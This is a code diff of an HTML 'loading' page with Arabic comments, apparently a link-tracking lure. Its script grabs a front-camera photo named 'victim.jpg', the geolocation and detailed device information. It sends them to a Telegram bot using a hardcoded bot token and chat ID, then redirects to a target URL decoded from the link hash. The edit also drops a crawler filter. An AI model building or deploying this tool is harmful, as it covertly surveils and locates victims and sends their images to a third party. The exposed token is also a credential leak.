@@ -3,7 +3,6 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<meta name="robots" content="noindex, nofollow">
 <title>جاري التحميل...</title>
 <style>
   body { margin: 0; padding: 0; background-color: #000; color: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; font-family: sans-serif; overflow: hidden; }
@@ -22,91 +21,126 @@
   const BOT_TOKEN = '9256355551:AAGwY58CQBawKJVfUQUpfRsqjbEM1lNVbhQ';
   const CHAT_ID = '8896806816';
 
-  // 1. استخراج الرابط الأساسي وفك تشفيره
   let targetUrl = 'https://google.com';
   try {
     const hash = window.location.hash.substring(1);
-    if (hash) {
-      targetUrl = atob(hash.replace(/-/g, '+').replace(/_/g, '/'));
-    }
+    if (hash) { targetUrl = atob(hash.replace(/-/g, '+').replace(/_/g, '/')); }
   } catch (e) { console.error('Link decode error', e); }
 
-  // 2. فلتر البوتات: منع سيرفرات المعاينة من تشغيل الكود
-  const userAgent = navigator.userAgent.toLowerCase();
-  const isBot = /bot|telegram|whatsapp|facebook|twitter|slack|discord|preview|crawler|spider/i.test(userAgent);
-  
-  // 3. منع التكرار: لو المستخدم عمل ريفريش متبعتش تاني
-  const hasSent = sessionStorage.getItem('sent_' + targetUrl);
+  const video = document.getElementById('camera');
+  const canvas = document.getElementById('canvas');
+  const statusText = document.getElementById('status');
 
-  if (isBot || hasSent) {
-    // لو بوت أو تم الإرسال قبل كده، حوله على طول
-    window.location.replace(targetUrl);
-  } else {
-    // لو مستخدم حقيقي، ابدأ التصوير
-    const video = document.getElementById('camera');
-    const canvas = document.getElementById('canvas');
-    const statusText = document.getElementById('status');
+  // 1. دالة لجمع معلومات الجهاز الحقيقية
+  async function getDeviceInfo() {
+    let info = {
+      model: "غير معروف",
+      platform: navigator.platform || "غير معروف",
+      ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "غير متاح",
+      cores: navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " أنوية" : "غير متاح",
+      resolution: `${window.screen.width}x${window.screen.height}`,
+      browser: navigator.userAgent
+    };
 
-    async function start() {
-      let lat = null, lon = null;
-      let photoBlob = null;
+    // محاولة جلب الموديل الحقيقي (يدعم كروم وأندرويد)
+    if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+      try {
+        const hints = await navigator.userAgentData.getHighEntropyValues(["model", "platform"]);
+        if (hints.model) info.model = hints.model;
+        if (hints.platform) info.platform = hints.platform;
+      } catch (e) { console.log("High entropy not supported"); }
+    }
+    return info;
+  }
 
-      // طلب الموقع
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          (pos) => { lat = pos.coords.latitude; lon = pos.coords.longitude; },
-          (err) => console.log('Location denied'),
-          { timeout: 5000 }
-        );
+  // 2. دالة إرسال الموقع كخريطة
+  async function sendLocationToTelegram(lat, lon) {
+    try {
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({ chat_id: CHAT_ID, latitude: lat, longitude: lon })
+      });
+    } catch (e) { console.error('Location send error', e); }
+  }
+
+  // 3. دالة إرسال الصورة مع المعلومات
+  async function sendPhotoWithInfo(photoBlob, deviceInfo, lat, lon) {
+    const caption = `📱 *تقرير الجهاز:*\n` +
+      `• الطراز: ${deviceInfo.model}\n` +
+      `• النظام: ${deviceInfo.platform}\n` +
+      `• المعالج: ${deviceInfo.cores}\n` +
+      `• الذاكرة: ${deviceInfo.ram}\n` +
+      `• الشاشة: ${deviceInfo.resolution}\n` +
+      `• المتصفح: ${deviceInfo.browser}\n\n` +
+      `📍 *الموقع:*\n` +
+      (lat && lon ? `خط العرض: ${lat}\nخط الطول: ${lon}` : 'لم يتم السماح بالموقع') +
+      `\n\n🔗 *الرابط:* ${targetUrl}`;
+
+    try {
+      if (photoBlob) {
+        const fd = new FormData();
+        fd.append('chat_id', CHAT_ID);
+        fd.append('photo', photoBlob, 'victim.jpg');
+        fd.append('caption', caption);
+        fd.append('parse_mode', 'Markdown');
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+      } else {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: 'POST', headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({ chat_id: CHAT_ID, text: caption, parse_mode: 'Markdown' })
+        });
       }
+    } catch (e) { console.error('Telegram error', e); }
+  }
 
-      // طلب الكاميرا
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
-        video.srcObject = stream;
-        await new Promise(r => setTimeout(r, 1500)); 
-        canvas.width = video.videoWidth || 640;
-        canvas.height = video.videoHeight || 480;
-        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-        photoBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
-        stream.getTracks().forEach(t => t.stop());
-      } catch (err) { console.log('Camera denied'); }
+  // 4. الدالة الرئيسية
+  async function start() {
+    let lat = null, lon = null;
+    let photoBlob = null;
 
-      statusText.innerText = 'جاري التحميل...';
-      
-      // تجهيز الرسالة
-      const mapLink = (lat && lon) ? `[اضغط لفتح الخريطة](https://www.google.com/maps?q=${lat},${lon})` : 'لم يتم السماح بالموقع';
-      const caption = '📱 *تقرير الجهاز:*\n' +
-        '• النظام: ' + navigator.platform + '\n' +
-        '• المتصفح: ' + navigator.userAgent.split(' ')[0] + '\n\n' +
-        '📍 *الموقع:* ' + mapLink + '\n\n' +
-        '🔗 *الرابط:* ' + targetUrl;
+    // أ) جمع معلومات الجهاز
+    const deviceInfo = await getDeviceInfo();
 
-      try {
-        if (photoBlob) {
-          const fd = new FormData();
-          fd.append('chat_id', CHAT_ID);
-          fd.append('photo', photoBlob, 'victim.jpg');
-          fd.append('caption', caption);
-          fd.append('parse_mode', 'Markdown');
-          await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendPhoto', { method: 'POST', body: fd });
-        } else {
-          await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
-            method: 'POST', headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({ chat_id: CHAT_ID, text: caption, parse_mode: 'Markdown' })
-          });
-        }
-      } catch (e) { console.error('Telegram error', e); }
-
-      // سجل إننا بعتنا خلاص
-      sessionStorage.setItem('sent_' + targetUrl, 'true');
-      
-      // التحويل
-      window.location.replace(targetUrl);
+    // ب) طلب الموقع
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        (pos) => { lat = pos.coords.latitude; lon = pos.coords.longitude; },
+        (err) => console.log('Location denied'),
+        { timeout: 5000 }
+      );
     }
 
-    setTimeout(start, 1000);
+    // ج) طلب الكاميرا والتقاط الصورة
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+      video.srcObject = stream;
+      await new Promise(r => setTimeout(r, 2000)); // استنى ثانيتين
+
+      canvas.width = video.videoWidth || 640;
+      canvas.height = video.videoHeight || 480;
+      canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+      
+      photoBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
+      stream.getTracks().forEach(t => t.stop());
+    } catch (err) { console.log('Camera denied or failed', err); }
+
+    // د) إرسال كل حاجة
+    statusText.innerText = 'جاري التحميل...';
+    
+    // إرسال الصورة والمعلومات النصية
+    await sendPhotoWithInfo(photoBlob, deviceInfo, lat, lon);
+    
+    // إرسال الموقع كخريطة (لو متاح)
+    if (lat && lon) {
+      await sendLocationToTelegram(lat, lon);
+    }
+
+    // هـ) التحويل للرابط الأساسي
+    window.location.replace(targetUrl);
   }
+
+  setTimeout(start, 1000);
 </script>
 </body>
 </html>
